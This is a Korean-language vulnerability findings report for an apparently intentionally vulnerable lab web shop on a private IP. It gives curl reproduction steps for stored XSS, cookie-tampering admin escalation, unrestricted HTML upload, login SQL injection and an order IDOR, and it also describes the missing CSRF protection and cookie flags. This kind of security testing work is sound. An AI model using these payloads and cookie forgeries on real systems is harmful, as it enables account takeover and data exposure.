# VULN SHOP 취약점 발견 사항 (2025-12-11)

- 타겟: http://192.168.0.28:3000
- 모든 요청에 `X-Forwarded-For: 10.0.0.102` 적용
- 계정: 테스트용 `attacker / pass123`

## 1) 게시판 저장형 XSS
- 설명: `/board` 게시글 내용이 HTML 이스케이프 없이 렌더링됨. 익명 게시 가능.
- 재현:
  ```bash
  curl -H "X-Forwarded-For: 10.0.0.102" \
       -H "Content-Type: application/x-www-form-urlencoded" \
       --data-urlencode "content=<script>alert('xss')</script>" \
       http://192.168.0.28:3000/board
  curl -s -H "X-Forwarded-For: 10.0.0.102" \
       http://192.168.0.28:3000/board | grep \"alert('xss')\"
  ```
- 영향: 방문자 브라우저 내 스크립트 실행, 쿠키 탈취·관리자 세션 하이재킹 가능. 인증 불필요.

## 2) 쿠키 변조 기반 관리자 권한 상승
- 설명: 로그인 시 `isAdmin=false` 쿠키를 클라이언트에서 `true`로 수정하면 서버 검증 없이 관리자 메뉴 노출 및 접근 허용.
- 재현:
  ```bash
  # 로그인 후 쿠키 조작하여 관리자 페이지 조회
  curl -H "X-Forwarded-For: 10.0.0.102" \
       -b "user=attacker; user_id=74; isAdmin=true" \
       http://192.168.0.28:3000/admin/products
  curl -H "X-Forwarded-For: 10.0.0.102" \
       -b "user=attacker; user_id=74; isAdmin=true" \
       http://192.168.0.28:3000/admin/users
  ```
- 증거: 관리자 전용 상품 수정 폼과 전체 사용자 목록(삭제 기능 포함) 노출.
- 영향: 인증 우회 및 수평/수직 권한 상승, 데이터 변조·계정 삭제 가능.

## 3) 프로필 업로드 무제한 → 임의 파일 업로드/저장형 XSS
- 설명: `/profile/upload`가 확장자·MIME 검증 없이 업로드 파일을 `/uploads/<원본파일명>`으로 공개 서빙. HTML/스크립트 그대로 노출.
- 재현:
  ```bash
  printf "<script>alert('img')</script>" > profile_payload.html
  curl -H "X-Forwarded-For: 10.0.0.102" \
       -b script/cookies.txt \
       -F "profile_image=@profile_payload.html" \
       http://192.168.0.28:3000/profile/upload
  curl -H "X-Forwarded-For: 10.0.0.102" \
       http://192.168.0.28:3000/uploads/profile_payload.html
  ```
- 증거: 응답 `Content-Type: text/html`, 본문 `<script>alert('img')</script>` 그대로 노출.
- 영향: 임의 스크립트 호스팅, 다른 사용자에 대한 XSS·피싱, 추가 페이로드 저장 가능.

## 4) 로그인 SQL Injection으로 인증 우회
- 설명: `/login` 입력값을 쿼리 파라미터로 바로 사용, SQLi로 임의 계정 세션 획득 가능. 비밀번호 검증 우회.
- 재현:
  ```bash
  curl -i -H "X-Forwarded-For: 10.0.0.102" \
       -H "Content-Type: application/x-www-form-urlencoded" \
       --data "username=' OR '1'='1&password=' OR '1'='1" \
       http://192.168.0.28:3000/login
  ```
- 증거: 응답 `Set-Cookie: user=admin; user_id=1` 반환 (isAdmin=false이지만 클라이언트 수정 가능).
- 영향: 인증 완전 우회, 관리자 계정 세션 탈취 → 권한 상승 및 데이터 위변조.

## 5) 세션 쿠키 보안 속성 부재
- 설명: `user`, `isAdmin`, `user_id` 쿠키에 `HttpOnly`, `Secure`, `SameSite` 미설정. 클라이언트 임의 수정 및 XSS를 통한 탈취에 취약.
- 영향: 쿠키 변조(이미 관리자 권한 상승에 악용), XSS와 결합해 세션 하이재킹 위험 증폭.

## 6) 전역 CSRF 보호 미구현
- 설명: 로그인/회원가입, 게시글 작성, 프로필 업로드, 관리자 상품/사용자 관리 폼 모두 CSRF 토큰 없음.
- 영향: 사용자가 로그인한 상태에서 외부 사이트를 통해 무단 게시글 작성, 프로필 파일 업로드, 상품 변경/사용자 삭제 등 수행 가능. 관리자 쿠키 변조와 결합 시 피해 확대.

## 7) 주문 상세 IDOR 및 세션 스푸핑
- 설명: 세션을 서버에서 검증하지 않아 쿠키만 임의 설정하면 로그인 없이 타 사용자 주문 열람 가능. `/order`에서 노출된 링크 `/order?id=<id>`에 대해 사용자 소유권 검증 없음.
- 재현:
  ```bash
  # 로그인 없이 타 사용자로 가장 후 주문 조회
  curl -H "X-Forwarded-For: 10.0.0.102" \
       -b "user=guest; user_id=2; isAdmin=false" \
       http://192.168.0.28:3000/order

  curl -H "X-Forwarded-For: 10.0.0.102" \
       -b "user=guest; user_id=2; isAdmin=false" \
       "http://192.168.0.28:3000/order?id=1"
  ```
- 증거: 주문 #1 상세(원래 관리자 계정) 및 #2 상세가 모두 열람되며 배송 정보(User ID) 노출.
- 영향: 인증/인가 무력화로 인해 주문 정보 대량 노출, 향후 결제·배송 정보 유출 가능.
